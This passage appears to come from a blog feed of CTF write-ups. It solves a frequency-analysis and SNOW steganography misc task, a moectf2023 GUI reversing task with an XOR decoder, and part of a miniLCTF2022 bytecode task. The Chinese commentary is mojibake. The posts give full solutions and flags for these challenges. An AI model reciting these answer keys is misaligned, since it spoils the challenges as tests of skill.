ZmCjM3p0FFx3F2CFQTpIMIQTSCIIdT5SCGpISTpFIS0ISFMxSnZTZXZYY3d4eSYyeGC0ZTT2SmpaSTYCaE0Ia3pTSTCGcSSIcG00MXBCSm2IZFEyFTdIbTJIFmx3SIZISndOZTpCICNoC2SIMCNFSI0SISCOZmN0ZmIIMF0oIIpGYIMxSnJaZm0CYT0ZeTdISmpOSTT5FFC3aISZcIdCbG0CCGxacSNZdI0IbEp4STd4aFI0ZXpZbECXSjNCCISqZ3pTZnBJFFI5ST2Ca0dISCAxFCIZeIdFZTNSSSpSSISIS2NGI30OS35XCICIeTFyeINXbIpGYnpCS2CIInpCMn0ZCICIIGNGCmTCZF3xSm2IImSGIX0IIG0FYmx3S2TCMCZXZTpxSGxOamJGbDSaSIZ0YI23SmNIITdIMF0FISSSeGZ0Z3dIbGZpSTdoeSCYcEdCbSCXSI53IGJIIT0CbIpTCDIadGZGCIdNZIC6SFCoC2TII3dCbFCXYT0IeTZZImCjbFC0SGxaCmECQTpXbICICTCCeSNISTd0MDSoSICIYIIGIXdaZmZFFTZIIS3ISCI0ZCB2FFCISFJGI3CFSTpICSC3cTpGFmTSZXBYS2d4S2TICEdSZm0qCICaSTZIaENIMST5CSS3aGJScETIS2B0SjIJemISITpIb0BTITSaC2dIcEdaZmZIYCIIM2YxITNCMFT4S20oSIJ0eG9SbX0TS2CIcSJZdI0Ib0AISGxoa2SZMFSIaF0XSjNoaIYICECIM35JSGx3aSdIMCZXbIp0YCJOcFNIbGIIb0BPSmxoQmSGITdaZIJZCSCINSFyeIdSMSpGFFxISFJFZTZSMIpXY2COc39ICmTIb3SFSmxjeGSxFnZCa2pqFmxIIIZIInd3b0BIFmCIbIJFQ3pIZ20SYSCJeIIGQTdSSIYCIXpGImSGSnNaZm0pYTC3eTdXdGCNZCB4S20IC2CFbI0FSSJ0STCIdINIdIdNa2BaSSd4Q2YyITSIa20XCSCISI3xITdjMIZTYFdoC32IcE9IbX0ZCDIJeGJGaISXZF0XII24IFNGSnZNS35YFm24MIpISjBXbIpCYTZCYSJXF30IMn00YCJ3ZSCICIdSSF05SmC3NITXF3dIb35pFm5Cb2ZXeECNbIpySIC3ITYINXpIMjSTYCI3dISZOSdSIISCSjJ4aFNIInZIbXZOSmCSd2CFIjB0M3CCFFCaSGJXaI0Ca2p2YFCaSTdCZmpIa2paISS3dFIIITSIaFxYS3S3aIdIITp3MDIJY3doF2CIcITXSmQIYCA2Z2CFZTZ0emxxSICoQ2NIInZTZ35oSmCINIFyNIIXZTpCFFCoYSJIcI0Ia3C2F2COcFI0bIdIb3JXSmCaaFSCS3COSIZYYmx3FICCcCISMSCTCE0OC2CFQTdIMn0PSjAxZSJZaIdNbTI2S2CaYIMyC300ZTCCSjI3SSCFQmICMTJSFmCaC2CZNSZIbCSDFCIacSJCdE5IbX0CSCIob2dGCE0TZTCaYT0IM2CSImI3ZCIYC2CoFFJIcI0IMnZ0SDJIeSNZaGxCZF0XIIxobFIGbISZIG0XCII2IIYyeGI0STpGSFpaSFEyFCBXSmZOCSCOIIN0ZTNSSF0FS3CaYIQIMXNXb3pIYCJIS2TIImICZmZyYFC3SFJScIpCSSpCSF23ZFNIeIdNSnBoSIpGd2NIcEdFbIxXYCIZd2CCcEdSM3S4Y3C3SGJ0eIdCaFZSISCIcTdIImxIbIp4SIT2CFICI30Sa3CYYCIIcTC0eGI3Z2SFFmxoSFJGc00IZ200SF2IS2ZFCmTIMm0FSIcxb2dIInZNSIJZCSC3IITZFmISM3pTSIxISFJYaG0aS200FTFxISZICE5Ib3I4STC3NITIIXTCaF0IS3S3ISCCMSNSMXBXSF2Ga32YQ3TSbX0CSCI3ZTNCZTdNS2EISmpGc2YxCIT0ZTppFjJoeIdICDBCST24SF5IbIJXFTBSbX0CCTCISTSICG0Ia2B6ICBoc2dZMF00I0BXY3dICISqI39CST50I3dIS2JIcE5IbGZ2FjJIeSSIaIZ0Mm0FIIC3FFNGSXdIa2ZZY3CINSpIImC0ZCIXFmpIS32qSTZIbCIGCFdOZ2IICGTXZCETSmCIZ2YyF30IaFxSYXpIcISCNFNOSTpxF20oFT2IbDNFSm0TSjJGc2NIaISIbSJFI3d4a2YxC0J3Zm0CCFCIISYydGI3MIZ0SGCaSGIIcI0CS2ZTYFCINTNZOIpNaCS0SFCaSFIIIX0CbICYSjNodTCXc20IMIZ2FmxIaGJIc0CIZmQIISdIS2SICI0SaCSXIIxIST5IcICXbFCXSmxIeT3IF39CS3T6YFdoSFJGcIBCMjICFjIIc35XaGxSZnBJSmTxNGEINF0IIGxCYCIIC2YISndSZTS2YFSOIIJIIn0IZCA2YI23Z2dFaICNbm0QSTZBeIYxCnIIbIpOYICaMTCIF3J3MTC0SG5IaTJCaI0Ca2C2SSCaS2SZCG0NSIITICBIaFIGIXp0ZTJ0SnpIMIpEZmIIMXBIFIxISFI6S3TXS2ZSFCJGZ2NIbICSZ20XISdTI2dGFnZTZTCYFTZIS2pIImCFbFS6FI2GSFJ0CjZCa3CCSjI3dSZCcIZIIEJoS3CjMISyCnNjZSp0FmI2SIZIIndNZmxySF2TIIJZcIdIMI02SjJGcTdCaId0a2p6SmpGC2dXZ3d0Zm0CCCJoSTYxY20NZ2I4SFx3aSNINI0SbnBCSTCIS2dZdI0IbXQCSmTxMIdGInJjI0BXCIpIdTCCMFCXSTC0FIxIS2JIcG9XI0B0SDJOS2JFCmpIMm0PSjBII2SIIX0XbFCaSm2IMICCeG9SM3S5SI5GSmJFZTZCa3CCSjJGZTZICIdSIEJ0S2ZCST2GI30CbGZYYCJoISTFIm9SZmZXSFCTa2SII3pSS200YFdIeTIqITdSZTpoS2C3C2YxInSSbEJXYCNCFIdIa0dIaCI0SF5ICTJIITdFS2ZXC3CaIGZ0ZTSNSnB5SCJ4b2dCI300IIpXCFCISIT6ZmC3SnB0SG2ISIJScE0IbIpqCFdJeICYbINXIEJCISd4YSdIInIFbE5XFm2IIIYyMFd0aCIYSIxII32GcI0Ia3CTSjJOZFJGaIdNMFpSSFCII2SxIX0IbTCIYT0oSIYII3CTSTpTCF0oS32IInpXaF0TSjIaZTdCOSd0aToCSjIac2CCZ30IbGZOYCNCYSCICDBSMST5FFxIFFJ0aIdCS2Z0YFxINTJFCINNIEJJIIC3bFJ0I3dSe3JXYT0ocSpEITdIMSpCY3CIaE2IITpXSCETFCJOc2CYCI0SbSJISIC3NGSIIXTOSCTSCSSIMICXNXNIMST6SIxCITCIcG0IbIpTYCIIZ2CICGTIIEJISm2IQFExInZIaFZ0FTCaISTZCINSMSJYCFSTSIJCFnpIMjEISCAxSmJEFTpNZTpyISd4ImSXZ3CPSnBoCSCIISCGF3dCS2JGCSCIYSJZNF9CI0BGCSCacTdCOIpNSTY2SIxoc2CCI3djZTCaYCJIdTp0e0J3MIZCI3dTFT2ScECIMnZICTdGS2NFSTJ0bEpYSmCIYSCGSnIIbFCXYXpGIIdZC0NSMFpCYTCoS2JCCX0Ca3p0FjI3ISp0ZTNIb3J6Sm2IZ2TICTdSZTpYYTSab2CCd0dNSTCXYF03IIJIcEdCbnBDSTCacFNGQTCNZnBoICSxZ2SxFnZSZm0CYCNCS2CCM00NZTS2CTS3SSd0aG0SbCISYFxIcSICZmTNS3pYSjS2C2QxInNIaTC0STdZd2CqZ3C3ZTCyYTCaSTTyaDJIa3T4Fm2IIIZZImxIb0BPSIT2QFIGC0NXbIpIFmxINI3ISmCISTYFSmxISmJGIjNIZSp0YCIIcmZIOSNNZ2cxSTcxNGExI3daZI0IFnpIS2ZSCINIZTT4SF2Ga2SxI3daZSp0SCJ3ZFNGCIdIe3STSISaImQIMSdSZ3poCI2oITdIF3CSMF50SFxIFFECFT0CbIFxFFxIcTdCdICNa2B3SScINSYxCETZaF0XF3SaI2pSIndCSTpCSm2IST2CaICIMn0qCFF2Z2pSCT0SZF0xSIxSMINIFTdISECYFmxINSpSYCSISCIXYTCIS2YCa0CIMjITFjI3dGI0ZTdSIEJoSFxaa2FxITdIb350FjJoc2TFZndCbIT4SICOaE2ZbDZIMI0ZSGxaIGIGCIp0MTJFSmpGcFMyZ3COSCSXY30CNICXM00IM3S4F203aTJXaI0SbnB0CIxISTCYaIZIa2oxSjJ4aFIII3CIIGZXCSCIcTSqITNIMIZ2FF2oFFJIcIpIS2BTYjI3c2dFZTJSIIJQSI24d2dGb0J0ZXZaSmCIIIFyNFNISTpCYTCoSSCIIm0aZSS4SmxIIGIGCm0NME3ySm2II32XCX0XIGxFY3CaIITCd0dXZTJISF53SSJCdCJSbCEIYIxacTdFcIpNZTS4S3dCeIJCC3CjZmZpS3SCeTCYcEdFbSC0I30ISIJSITSSbG0DCGxaIE2SaGTNaFITSTd4bFJGITTSbEJaYCJISIYIImI3ZCISFIx3CTJIIjSIZTpCSCI3IIJYbG0IbEpYSmCId2ZGSXdXbGZqYXpIIIdZCG90ZCI0S20ISFExcI0XSTpCSjIIcmIGIm0NbI0SS2dTYSTXC3dXbTJIFTdISSCCe0dNZTJXSIxOaGI6ZnTIMnZSSmIxcSCIFTpISnBQSI24CFZGInNaZCSCCI2oZTCCcENCST25SGx3SGJIITZCaFZSS3CacTCCZTpIbSJISSd4YSZIInNSZICICI5ocTCZCECCZ2C0YFCIaSJZcEZXbIC0ISCaS2ZFImCIaCSPSm2TdT5ICIdIbFCaSjBaISSCcGIIM3pYYFCISFJYaExSMIp2FTCGISp0eINSS3p0S2CIYISyZT0CbGZFY3CaISCqCTN3bICSFmCTa32Ic0pCSIQTSCJIdGSGaIdIbSI2SmpBMIMxInN0Z2BCYTC3ITCXMCZ3MFT4ST0IC2YIImIIbXZ2FjICeF2SCIpIb0B6ICBaQ2dCSnJjZX0IYICaFIpICECIMSJyCTdIST2Ca0CIbCB2CDJZeSCZI39ISF0XSjB3NICGbISCbE5YSmxIM2dZI39XZTpTCF0ISFJGI30IMIpTYCJOZSICZTNIMm05S2dTa2MxC3dIbTCpFm2ob2ZXc2dTZmZXSm2GSE2IcI0SMjSTYFC3dSIIaICSZ3pYITCaYIZ0C3C3ZTJOSTZIISCCMCZIMSCTFFCoaIJCaGICSEpSF3CaSTdCdGpNS2SISI24a2ZCZjCISECXSnpId2TFZmIXZ35CYFdoF2C0eG0XSTJ0ISFIeGNIaGxIMIpxSICoQ2NIC0JXbE5SY3SIIIYyd0NIMDI2SIxoITCIImIaSTpPCICIc2SCbG0TbIpCSmCaSFExSX0XaFZYYmx3c2FISCIjSmxyI3COCTCCFnTIbIJ0SmIxcmNICIpNZnB6SjBaYIMxC0SCbICXSm5CaIdISmIFM324SF5OSIJXeIZFSTC2YjIacTdICIpIaCETSCJTa2d0InJXbICaS3F2SIYxImI3Z2CSFmI2SFJ0dCIXbICZCFdGZ2dFImTIZ3pXSIc2FFZIIXdaZXZCCSdIMSFyeGCSMFpXYTCGSFJYQ30Ia3pCSjIIdSZCaINNbm0CS3CIIFSxC0NXb35aCCJoFISqZ3dOZTS5CTF5IIJCF3TCSIM2SmIxIISIFTd0MXBFSjB3CmSCZ3CPS35pFjNjeIYyeId0MDI0S20ISGJGc0ISMGQTISCISTdFCG0IbGI2SICIYIJGIXdOSIxaSTCIcTC0eEC3S3CxSFxoS2JXdCBIS2B0FCJNeICFSTSSSF0FSIc2b2CII3dXbGZZYXpGeTYyNSNFbE5SSI5OSmJGI30SMIp0YCJGIGZGSmTIb3I2S2CIYIExC0ZCbICXYCI3IIZSIndIZTpxFm53SIJFbITCMGZCSCJ3cTNZdIdNbm0YISZGImSGITTaZCSXY30CFSCqQm9ZMIxXSF5OIGJCFTTSbX02CFCISFI0dG0NZECXSGxod2dCZX0jIEpaSmxICIT6I39CZCTXYFC3aSJYQ3pIbXB3CFCCeINYbIS0MXBISI24IFNGIXdIa2ZXSmxIIICXdDB0SCIYSIxoST2FFnJIMGZTSmx3dSNISTdSZTYTSmpCYSdCSTCOSTpQSm5CIITFC3NCSTpSF2ZGSE2IcI0IMI02Sm23IGIGaISISnACICJ4cmSXS30IbXZCCSSIISYydGIFMSJCFF5OaETyeI0FSTp2STC3S2pIcGxIbSSxSTd4FFIIIXp0IIpXSjNIS2ZIInNIMIZ2SGxoaIJIIn0XS2Z0CDJIZ2CFF39IM2JXSISIZ2dGSXTOIGZXCSSSMTSCNIIXbFS5SIC3YSCXFTBSa3pTFjIIZ35ICE5ISmIFSmpGYSFxCX0FbTJXYCJIISTZCDZ0ZTCCSIx3S2CIIn0SMjA2SjJ3IISIbGIISnBySmCSeIdGSnJ0ZnBoCI2oFSdISmICMDSTFFCIFFJSQm9FSm0DSICadE2FFTdNSmI2SI2Tb2SGInNjZCTIYCIaaIYyeGIjMXBJI3COCTCFQjSIZTpSSjJGZ2ZZCGpIMIpYIIxobTTxbICXbIpZCS0CIIdZITNIMDI0YTSIST2FFm0IZEp0SjIIcTdIFmTSIEJCS3CjMSFxI3dIb3CFYCIIc2SCMSNXbGxISFT5aICZbDCCSI0ZSjICemIGFTpTa2pySIpGaFZICnZIbE5CYCNCYSCCM00OZ2I4I3C3aETyFT0CI0BCYjIISTSZCIdNS3p6SmTINSd0I3djZIZSY3doCIYIImIjM35GCFC3CTJFQTTXI0BTFjIJeIdFCmIISICPSmxoQ2TIInZ3Z2ZOFm24IIdZaINIM3pSYFCaITCIIjNISTp0CEFxS2ZIS35IMF0XSTcxNGQxFnNCbTJIY3CIS2CFcEC3MSpSFS0oIISxI30CSSpZSG23dGISbI0IbSEIS3ZGIFZGFnJ0ZF0CY30Cd2CqQmCSbSCCSF5Ia2SIInJFSTC2CIxZd2CCZTCIb0B6SCJ4F2CIIT00ZSJICSCIaI3ye0dCST5GCTC3aSSCY2dIbXB0YjJZeIpSI35CZ20XIIC3b2TIb0JXa2ZFFmx3STSCeGCFM3pGSFxIITCIcIZISEpGCIxGdIJIaIdNMFpSSjIaYIExIX0FbGxpFjJoSITIaG9XSmZXI3ZCSE2ZNXpISCSTSTd3STdIaISIM2SCSCBaYIZ0S3dFbI0XY30CITdISm9SMIZ0S20ISmJXaIdaS2Z0YFCINTJCdGpSSSpJI3SaC2YxIXp0ZTCXY3dONIZSCIJTSTp2SGx3IISCa0pISEJICSC3Z2dFZTJSbSJSSITxMETxIXT3ZCTYFjBIIITZFmIXbIpYSI5aST2qZT0CMn0ZYCIGd</span><br></pre></td></tr></table></figure>
<p>åˆå­¦ä¹ åˆ°äº†è¿™ç§ç”¨è¯é¢‘ç»Ÿè®¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = s <span class="comment">#æ–‡ä»¶æ‰“å¼€å¤„</span></span><br><span class="line"> </span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">	counts = strings.count(i)</span><br><span class="line">	i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	result[i] = counts</span><br><span class="line"> </span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">	<span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°å‡ºç°é¢‘ç‡ : ISCTFZ023daGYXpJmbNxMcEjn5BeoOQy4D9q6PAfghiklrstuvwzHKLRUVW178!@#$%^&amp;*()_+- &#x3D;{}[]<br>æœ‰æ„ä¹‰çš„ä¸º ISCTFZ023 ä½œä¸ºsnowéšå†™çš„å¯†ç  æœ€åå¾—åˆ°flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./SNOW.EXE -C -p ISCTFZ023 flag.txt</span><br></pre></td></tr></table></figure>
<p>flag: ISCTF{34da-a87s-sk87-s384-3982-398233}</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1>]]></content>
      <categories>
        <category>CTF-WP</category>
      </categories>
  </entry>
  <entry>
    <title>Reverse-Other</title>
    <url>/2023/12/08/Reverse-Other/</url>
    <content><![CDATA[<p>è®°å½•ä¸€äº›reverseé¢˜ç›®</p>
<span id="more"></span>

<h1 id="moectf2023"><a href="#moectf2023" class="headerlink" title="moectf2023"></a>moectf2023</h1><h2 id="GUI"><a href="#GUI" class="headerlink" title="GUI"></a>GUI</h2><p>IDAæ‰“å¼€è·Ÿè¿› å¾ˆå®¹æ˜“å‘ç°å…³é”®ä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Msg != <span class="number">273</span> )</span><br><span class="line">        <span class="keyword">return</span> DefWindowProcW(hWndParent, Msg, wParam, lParam);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)wParam == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        DlgItem = GetDlgItem(hWndParent, <span class="number">2</span>);</span><br><span class="line">        GetWindowTextW(DlgItem, String, <span class="number">1024</span>);</span><br><span class="line">        sub_150C94(String);</span><br><span class="line">        v13 = <span class="number">0</span>;</span><br><span class="line">        sub_150A0A(v7, v8);</span><br><span class="line">        LOBYTE(v13) = <span class="number">1</span>;</span><br><span class="line">        sub_150C94(a91);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_1531AB(v7, v6) )</span><br><span class="line">          MessageBoxW(hWndParent, Text, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          MessageBoxW(hWndParent, <span class="string">L&quot;Sorry, flag error.&quot;</span>, <span class="string">L&quot;hint&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        sub_1529B8(v6);</span><br><span class="line">        LOBYTE(v13) = <span class="number">0</span>;</span><br><span class="line">        sub_1529B8(v7);</span><br><span class="line">        v13 = <span class="number">-1</span>;</span><br><span class="line">        sub_1529B8(v8);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>è·Ÿè¿› sub_150A0A(v7, v8); ä¼šå‘ç°é‡Œé¢è¿›è¡Œäº† (-5)^0x51 æ“ä½œ<br>åé¢è¿›è¡Œäº†strcmpçš„check<br>è¿™é‡Œæ¯”è¾ƒçš„å¦ä¸€ä¸ªæ•°ç»„æå–æœ‰ç‚¹å¥‡æ€ª<br>åŠ¨è°ƒä¼šè¢«åè°ƒè¯•æ‰ setipè·³åˆ°è¿™é‡Œä¹‹å‰å¾—åˆ°çš„å€¼ä¹Ÿä¸å¯¹<br>æ³¨æ„åˆ°checkå‰é¢è¿˜æœ‰å¥: <code>sub_150C94(a91);</code><br>æŸ¥çœ‹a91çš„å€¼çŒœæƒ³å¯èƒ½æ˜¯æ¯”è¾ƒæ•°ç»„ å› ä¸ºè¿™ä¸ª sub_150c94æ²¡æœ‰æ”¹å˜å€¼<br>æ‰€ä»¥æœ€åexp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x3E</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x7C</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, <span class="number">0x29</span>]</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span>(x!=<span class="number">0</span>):</span><br><span class="line">        c.append(x)</span><br><span class="line">enc = c</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((x^<span class="number">0x51</span>)+<span class="number">5</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># moectf&#123;GU1&amp;&amp;W1nd0w2_Pr1m3r!!!&#125;</span></span><br></pre></td></tr></table></figure>
<p>çœ‹WPè¯´å¯ä»¥ç›´æ¥è¾“å…¥æ‰€ä»¥å¯èƒ½å­—ç¬¦å¾—åˆ°åŠ å¯†å€¼æ¥æ¯”è¾ƒå¾—åˆ°(å› ä¸ºæ˜¯å•å­—èŠ‚åŠ å¯†) ä½†æ˜¯æˆ‘åŠ¨è°ƒæˆªä¸åˆ°å¯¹åº”å€¼â€¦ ä»¥åå†æ¥çœ‹å§</p>
<h1 id="miniLCTF2022"><a href="#miniLCTF2022" class="headerlink" title="miniLCTF2022"></a>miniLCTF2022</h1><h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0: const 25 ; &lt;module &#x27;main&#x27;&gt; </span><br><span class="line">5: module 1 590</span><br><span class="line">11: const 26 ; &lt;module &#x27;src&#x27;&gt; </span><br><span class="line">16: store 0 0</span><br><span class="line">19: const 26 ; &lt;module &#x27;src&#x27;&gt; </span><br><span class="line">24: module 6 590</span><br><span class="line">30: const 27 ; 221492336 </span><br><span class="line">35: store 0 0</span><br><span class="line">38: const 28 ; next </span><br><span class="line">43: define 0 0 0 0 80</span><br><span class="line">52: load 1 0</span><br><span class="line">55: const 29 ; 3735928559 </span><br><span class="line">60: mul</span><br><span class="line">61: const 30 ; 2974593325 </span><br><span class="line">66: add</span><br><span class="line">67: const 31 ; 4294967295 </span><br><span class="line">72: mod</span><br><span class="line">73: store 1 0</span><br><span class="line">76: load 1 0</span><br><span class="line">79: return</span><br><span class="line">80: store 0 1</span><br><span class="line">83: const 32 ; n </span><br><span class="line">88: const 33 ; __init__ </span><br><span class="line">93: define 0 0 1 2 377</span><br><span class="line">102: array 0</span><br><span class="line">107: self</span><br><span class="line">108: const 34 ; enc </span><br><span class="line">113: setattr</span><br><span class="line">114: array 0</span><br><span class="line">119: self</span><br><span class="line">120: const 35 ; flag </span><br><span class="line">125: setattr</span><br><span class="line">126: const 36 ; 330150339 </span><br><span class="line">131: const 37 ; 665229750 </span><br><span class="line">136: const 38 ; 1030425184 </span><br><span class="line">141: const 39 ; 626644061 </span><br><span class="line">146: const 40 ; 861166604 </span><br><span class="line">151: const 41 ; 521761774 </span><br><span class="line">156: const 42 ; 586337393 </span><br><span class="line">161: const 43 ; 167708778 </span><br><span class="line">166: const 44 ; 495518230 </span><br><span class="line">171: const 45 ; 459905620 </span><br><span class="line">176: const 46 ; 47689903 </span><br><span class="line">181: const 47 ; 541128627 </span><br><span class="line">186: const 48 ; 735310319 </span><br><span class="line">191: const 49 ; 924471115 </span><br><span class="line">196: const 50 ; 66957703 </span><br><span class="line">201: const 51 ; 827308967 </span><br><span class="line">206: const 52 ; 4680810 </span><br><span class="line">211: const 53 ; 618187854 </span><br><span class="line">216: const 54 ; 1041878913 </span><br><span class="line">221: const 55 ; 424705310 </span><br><span class="line">226: const 56 ; 258515107 </span><br><span class="line">231: const 57 ; 301365991 </span><br><span class="line">236: const 58 ; 238089888 </span><br><span class="line">241: const 59 ; 126810196 </span><br><span class="line">246: const 60 ; 160092960 </span><br><span class="line">251: const 61 ; 333469062 </span><br><span class="line">256: const 62 ; 524809386 </span><br><span class="line">261: const 63 ; 334234642 </span><br><span class="line">266: const 64 ; 532732060 </span><br><span class="line">271: const 65 ; 701306806 </span><br><span class="line">276: const 66 ; 755999918 </span><br><span class="line">281: const 67 ; 219942343 </span><br><span class="line">286: const 68 ; 37219027 </span><br><span class="line">291: const 69 ; 76267819 </span><br><span class="line">296: const 70 ; 2141786733 </span><br><span class="line">301: array 35</span><br><span class="line">306: self</span><br><span class="line">307: const 71 ; res </span><br><span class="line">312: setattr</span><br><span class="line">313: const 72 ; 0 </span><br><span class="line">318: store 0 1</span><br><span class="line">321: load 0 1</span><br><span class="line">324: load 0 0</span><br><span class="line">327: lt</span><br><span class="line">328: jz 371</span><br><span class="line">333: self</span><br><span class="line">334: const 34 ; enc </span><br><span class="line">339: getattr</span><br><span class="line">340: const 73 ; append </span><br><span class="line">345: getattr</span><br><span class="line">346: load 1 1</span><br><span class="line">349: call 0</span><br><span class="line">351: call 1</span><br><span class="line">353: pop</span><br><span class="line">354: load 0 1</span><br><span class="line">357: const 74 ; 1 </span><br><span class="line">362: add</span><br><span class="line">363: store 0 1</span><br><span class="line">366: jmp 321</span><br><span class="line">371: const 75 ; nil </span><br><span class="line">376: return</span><br><span class="line">377: const 33 ; __init__ </span><br><span class="line">382: const 76 ; x </span><br><span class="line">387: const 77 ; y </span><br><span class="line">392: const 78 ; sign </span><br><span class="line">397: define 0 0 2 3 482</span><br><span class="line">406: const 72 ; 0 </span><br><span class="line">411: store 0 2</span><br><span class="line">414: load 0 2</span><br><span class="line">417: const 79 ; 35 </span><br><span class="line">422: lt</span><br><span class="line">423: jz 476</span><br><span class="line">428: self</span><br><span class="line">429: const 35 ; flag </span><br><span class="line">434: getattr</span><br><span class="line">435: const 73 ; append </span><br><span class="line">440: getattr</span><br><span class="line">441: load 0 0</span><br><span class="line">444: load 0 2</span><br><span class="line">447: getitem</span><br><span class="line">448: load 0 1</span><br><span class="line">451: load 0 2</span><br><span class="line">454: getitem</span><br><span class="line">455: bxor</span><br><span class="line">456: call 1</span><br><span class="line">458: pop</span><br><span class="line">459: load 0 2</span><br><span class="line">462: const 74 ; 1 </span><br><span class="line">467: add</span><br><span class="line">468: store 0 2</span><br><span class="line">471: jmp 414</span><br><span class="line">476: const 75 ; nil </span><br><span class="line">481: return</span><br><span class="line">482: const 78 ; sign </span><br><span class="line">487: const 80 ; RunMe </span><br><span class="line">492: class 4 0</span><br><span class="line">495: store 0 2</span><br><span class="line">498: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">503: const 81 ; [+] Starting... </span><br><span class="line">508: call 1</span><br><span class="line">510: pop</span><br><span class="line">511: load 0 2</span><br><span class="line">514: const 79 ; 35 </span><br><span class="line">519: call 1</span><br><span class="line">521: store 0 5</span><br><span class="line">524: load 0 5</span><br><span class="line">527: const 78 ; sign </span><br><span class="line">532: getattr</span><br><span class="line">533: load 0 5</span><br><span class="line">536: const 71 ; res </span><br><span class="line">541: getattr</span><br><span class="line">542: load 0 5</span><br><span class="line">545: const 34 ; enc </span><br><span class="line">550: getattr</span><br><span class="line">551: call 2</span><br><span class="line">553: pop</span><br><span class="line">554: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">559: load 0 5</span><br><span class="line">562: const 35 ; flag </span><br><span class="line">567: getattr</span><br><span class="line">568: call 1</span><br><span class="line">570: pop</span><br><span class="line">571: const 23 ; &lt;function &#x27;print&#x27;&gt; </span><br><span class="line">576: const 82 ; [+] Done! </span><br><span class="line">581: call 1</span><br><span class="line">583: pop</span><br><span class="line">584: const 75 ; nil </span><br><span class="line">589: return</span><br></pre></td></tr></table></figure>

<p>lemonå®˜æ–¹æ–‡æ¡£å…¨æŒ‚äº†ã€‚ã€‚ã€‚<br>ç£•ç£•ç»Šç»Šè¿˜åŸä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">seed = <span class="number">0xd33b470</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next</span>():</span><br><span class="line">    <span class="keyword">global</span> seed</span><br><span class="line">    seed = (seed * <span class="number">0xdeadbeef</span> + <span class="number">0xb14cb12d</span>) % <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">return</span> seed</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunMe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,n</span>):</span><br><span class="line">        self.enc = []</span><br><span class="line">        self.flag = []</span><br><span class="line">        self.res = [<span class="number">2141786733</span>, <span class="number">76267819</span>, <span class="number">37219027</span>, <span class="number">219942343</span>, <span class="number">755999918</span>, <span class="number">701306806</span>, <span class="number">532732060</span>, <span 